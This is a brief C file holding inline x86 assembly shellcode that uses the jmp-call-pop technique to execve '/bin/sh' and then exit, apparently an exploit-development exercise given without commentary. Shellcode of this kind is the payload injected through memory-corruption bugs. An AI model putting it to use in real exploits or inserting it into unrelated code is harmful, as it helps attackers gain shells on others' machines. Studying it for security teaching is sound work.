void main(){
__asm__(
"jmp call123;"
"pop1: pop %rsi;"
"xor %rax, %rax;"
"mov %rax, %rcx;"
"mov %rax, %rdx;"
"mov %rsi, %rbx;"
"movb $0xb, %al;"
"int $0x80;"
"xor %rbx, %rbx;"
"mov   %rbx,%rax;"
"inc    %rax;"
"int    $0x80;"
"call123: call   pop1;"
".string \"/bin/sh\";"
);
}
